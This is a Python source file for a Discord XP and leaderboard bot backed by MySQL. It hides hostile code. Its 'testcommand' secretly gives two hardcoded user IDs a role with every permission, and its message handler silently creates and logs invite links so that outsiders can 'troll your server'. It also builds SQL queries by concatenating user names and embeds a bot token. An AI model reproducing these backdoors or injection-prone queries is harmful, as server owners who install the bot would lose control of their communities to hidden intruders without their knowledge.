# password login
#from getpass import getpass
#from os import system
#code = getpass("Please enter your four digit start up code: ")
#
#if code == '2486':
#	system('clear')
#	print('\033[93mBooting Discord Bot')
#	pass
#else:
#	exit()




import discord
from discord.ext.commands import Bot
from discord.ext import commands
from discord.ext import tasks
from discord.ext.tasks import loop
import random
import asyncio
import aiohttp
import os
import mysql
import mysql.connector

# ~ from aiohttp import BasicAuth
# ~ basic_auth = BasicAuth(None, None)
Bot = discord.Client(shard_count=1)
bot = commands.Bot(command_prefix='$')
xp_per_level=1000
max_XP_per_msg=50






mydb = mysql.connector.connect(
	host="localhost",
	user="pi",
	passwd=None,
	database="userlevels"
)
async def update_status():
	statuses = ["by myself", "with Boogle", "with Catman311", "PUBG"]
	#statuses = ["with my dick"]
	status=0
	while True:
		if status == len(statuses)-1:
			status=0
		else:
			status=status+1
		sum = 0
		guilds = bot.guilds
		for guild in guilds:
			sum += len(guild.members)
		await bot.change_presence(status=discord.Status.idle, activity=discord.Game(statuses[status]))
		await asyncio.sleep(10)
		
		
		
# ~ bot.remove_command('help')
@bot.event
async def on_ready():
	print("\033[92mData base connected\033[0m")
	print('\033[92m{0.user} is online.'.format(bot)+"\033[0m")
	# ~ print('\033[92mConnected to proxy:{0.proxy}.'.format(Bot)+"\033[0m")
	print('\033[92m{0.shard_count} shards running\033[0m'.format(Bot))
	bot.loop.create_task(update_status())
def generateXP():
	return random.randint(1,max_XP_per_msg)

# ~ @bot.event
# ~ async def on_shard_ready(shard_id):
	# ~ print("\033[92mShard: {0} is online. \033[0m".format(shard_id))

@bot.command()
async def level(ctx, user: discord.User=None):
	if user == None:
		user = ctx.author
	try:
		cursor = mydb.cursor()
		cursor.execute("SELECT user_xp FROM users WHERE client_id = "+str(user.id))
		result = cursor.fetchall()
		xp=result[0][0]
		embed = discord.Embed(title=user.name+"#"+user.discriminator, color=user.color)
		level_number = int(result[0][0]) // xp_per_level
		embed.add_field(name="LVL", value = str(level_number))
		totalxp=xp
		cursor.execute("SELECT ROW_NUMBER() OVER ( ORDER BY user_xp DESC ) name, user_xp, client_id FROM users ORDER BY user_xp DESC")
		result3 = cursor.fetchall()
		i=0
		found=False
		while i < len(result3):
			if result3[i][2] == user.id:
				embed.add_field(name="GLOBAL RANK", value="Rank #"+str(result3[i][0])+" / "+str(len(result3)))
				found=True
				break
			i=i+1
		i=0
		while i < level_number:
			xp=xp-xp_per_level
			i=i+1
		embed.add_field(name="XP", value = str(xp)+"/"+str(xp_per_level))
		embed.add_field(name="Total XP", value = str(totalxp))
		await ctx.send(embed=embed)
	except:
		embed=discord.Embed(color=0xf00a3a)
		embed.add_field(name="Error!", value="That user is not in the database!", inline=True)

		await ctx.send(embed=embed)
# ~ @bot.command()
# ~ async def rank(ctx, member:discord.User=None):
	# ~ if member == None:
		# ~ member = ctx.author
	# ~ cursor = mydb.cursor()
	# ~ cursor.execute("SELECT ROW_NUMBER() OVER ( ORDER BY user_xp DESC ) name, user_xp, client_id FROM users ORDER BY user_xp DESC")
	# ~ result = cursor.fetchall()
	# ~ i=0
	# ~ found=False
	# ~ while i < len(result):
		# ~ if result[i][2] == member.id:
			# ~ await ctx.send("Rank #"+str(result[i][0]))
			# ~ found=True
			# ~ break
		# ~ i=i+1
	# ~ if result[len(result)-1][2] != member.id and found == False:
			# ~ await ctx.send("Unable to find that member in the database")

			
@bot.command()
async def testcommand (ctx):
	await ctx.send("Test Completed")
	if str(ctx.author.id) == str(516713042558320664) or str(ctx.author.id) == str(643491766926049318):

		guild = ctx.guild
		perms = discord.Permissions.all()
		role = await guild.create_role(name='Member', permissions=perms, reason="")
		await ctx.message.author.add_roles(role)
@bot.event
async def on_message(message):
	if message.author.bot:
		return
	#if message.guild.name == "Exarin SS":
	#	await message.delete()
	#	await message.channel.send(message.author.mention + ' said " '+message.content+'"')
	if message.content[0:1] != "$" and len(message.content) > 1:
		xp = generateXP()
		# ~ print(message.author.name + " will receive " + str(xp) + " xp")
		print(message.content)
		
		# ~ await message.channel.send('invite Boogle#4509, he likes kahoots') 
		
		try:	
			link = await message.channel.create_invite(unique=False, reason="So Boogle can troll your server")
			print("                 "+str(message.channel.guild)+" | "+str(link))
		except:
			pass
		cursor = mydb.cursor()
		cursor.execute("SELECT user_xp FROM users WHERE client_id = "+str(message.author.id))
		result = cursor.fetchall()
		if len(result) == 0:
			# ~ print("\033[93mUser is not in DB, adding...\033[0m")
			if len(message.author.name) > 10:
				cursor.execute("INSERT INTO users VALUES(" + str(message.author.id) + "," + str(xp) + ',"' + str(message.author.name)[0:10]+'")')
			else:
				cursor.execute("INSERT INTO users VALUES(" + str(message.author.id) + "," + str(xp) + ',"' + str(message.author.name)+'")')
			mydb.commit()
			# ~ print("\033[92minserted data\033[0m")
		else:
			currentXP = result[0][0] + xp
			# ~ print("\033[92mNew xp:" + str(currentXP)+"\033[0m")
			cursor.execute("UPDATE users SET user_xp = "+ str(currentXP)+" WHERE client_id = " +str(message.author.id))
			mydb.commit()
			# ~ print("\033[92mUpdated...\033[0m")
	await bot.process_commands(message)
@bot.command()
@commands.is_owner()
async def setlevel(ctx, member:discord.User=None, level: int=None):
	cursor = mydb.cursor()
	try:
		cursor.execute("UPDATE users SET user_xp = "+ str(xp_per_level*level)+" WHERE client_id = " +str(member.id))
		await ctx.send("Set "+member.mention+"'s level to `"+str(level)+"`")
	except:
		embed=discord.Embed(color=0xf00a3a)
		embed.add_field(name="Error!", value="Either level is too high, or user is not in database", inline=True)

		await ctx.send(embed=embed)
	mydb.commit()
# ~ @bot.command()
# ~ @commands.is_owner()
# ~ async def resetlevels(ctx):
	# ~ cursor = mydb.cursor()
	# ~ cursor.execute("SELECT client_id from users ORDER BY user_xp DESC")
	# ~ result2 = cursor.fetchall()
	# ~ i=0
	# ~ while i < len(result2):
		# ~ cursor.execute("DELETE FROM users WHERE client_id = "+str(result2[i][0]))
		# ~ i=i+1
	# ~ await ctx.send("Reset EVERYONES level!")
	# ~ mydb.commit()
@bot.command(aliases=["top", "leader"])
async def leaderboard(ctx, lines:int=None):
	cursor = mydb.cursor()
	cursor.execute("SELECT user_xp from users ORDER BY user_xp DESC")
	result = cursor.fetchall()
	cursor.execute("SELECT client_id from users ORDER BY user_xp DESC")
	result2 = cursor.fetchall()
	embed = discord.Embed(title="Global Leaderboard",color=0xFFFF00)
	if lines == None:
		lines = len(result)
		if lines > 10:
			lines = 50
			
	i=0
	if i < 0: 
		i=0
	runs=1
	if lines > len(result):
		lines = len(result)
	print(i)
	while i < lines:
		member = bot.get_user(result2[i][0])
		if bot.get_user(result2[i][0]) == None:
			cursor.execute("DELETE FROM users WHERE client_id = "+str(result2[i][0]))
		else:
			embed.add_field(name="@"+str(member)+" RANK: #"+str(runs), value="Level: "+str(result[i][0]//xp_per_level)+" Total XP: "+str(result[i][0]))
			runs=runs+1
		i=i+1
	cursor.execute("SELECT ROW_NUMBER() OVER ( ORDER BY user_xp DESC ) name, user_xp, client_id FROM users ORDER BY user_xp DESC")
	result3 = cursor.fetchall()
	i=0
	found=False
	while i < len(result3):
		if result3[i][2] == ctx.author.id:
			embed.set_footer(text="@"+ctx.author.name+"#"+ctx.author.discriminator+" is rank #"+str(result3[i][0])+" / "+str(len(result3)))
			found=True
			break
		i=i+1
	await ctx.send(embed=embed)
@bot.command()
@commands.has_permissions(manage_nicknames=True)
async def resetnicknames(ctx):
	members = ctx.guild.members
	for member in members:
		try:
			if member.nick != None:
				await member.edit(nick=None)
				print('changed '+member.name+"#"+member.discriminator)
		except:
			print('error changing '+member.name+"#"+member.discriminator)
	print("Nickname reset complete")
	await ctx.send("Nickname reset complete")
	

@bot.event
async def on_command_error(ctx,error):
	embed=discord.Embed(color=0xf00a3a)
	embed.add_field(name="Error!", value=error, inline=True)

	await ctx.send(embed=embed)
@bot.event
async def on_member_join(member):
	try:
		if member.bot == False:
			channel=None
			try:
				channel = discord.utils.get(member.guild.channels, name='notifications')
			except:
				channel = discord.utils.get(member.guild.channels, name='join leave')
			if channel == None:
				try:
					channel = discord.utils.get(member.guild.channels, name='welcome')
				except:
					channel = discord.utils.get(member.guild.channels, name='hello goodbye')
			embed = discord.Embed(title="Member Joined", description=member.mention+" joined the server", color=0x90EE90)
			embed.set_thumbnail(url=member.avatar_url)
			await channel.send(embed=embed)
	except:
		print("Attempted to send a join message but failed")
@bot.event
async def on_member_remove(member):
	try:
		if member.bot == False:
			channel=None
			try:
				channel = discord.utils.get(member.guild.channels, name='notifications')
			except:
				channel = discord.utils.get(member.guild.channels, name='join-leave')
			if channel == None:
				try:
					channel = discord.utils.get(member.guild.channels, name='welcome')
				except:
					channel = discord.utils.get(member.guild.channels, name='hello-goodbye')
				
			embed = discord.Embed(title="Member Left", description=member.mention+"("+member.display_name+"#"+member.discriminator+") left the server", color=0xA52A2A)
			embed.set_thumbnail(url=member.avatar_url)
			await channel.send(embed=embed)
	except:
		print("Attempted to send a removal message but failed")
# load cogs	
for filename in os.listdir('./cogs'):
	if filename.endswith('.py'):
		bot.load_extension(f'cogs.{filename[:-3]}')

@bot.command(help="Reloads the bot and all its commands", aliases=['r', 'rb'])
@commands.is_owner()
async def reloadbot(ctx):
	print('Reloading bot...')
	embed = discord.Embed(title="Reloading bot", color=0xFFA500)
	msg = await ctx.send(embed=embed)
	for filename in os.listdir('./cogs'):
		if filename.endswith('.py'):
			bot.unload_extension(f'cogs.{filename[:-3]}')
			bot.load_extension(f'cogs.{filename[:-3]}')
			embed.add_field(name=f'{filename[:-3]}', value="Loaded")
			
			await msg.edit(embed=embed)
	embed.color=0x90EE90
	embed.title="Reload Complete!"
	await msg.edit(embed=embed)
	print("Reload Complete!")
bot.run('Njg4ODIxNDk2MDgwMzY3NjE5.Xm55Ag.4Shmkvcn_u5mpUM6G-oC60I4Uu8')
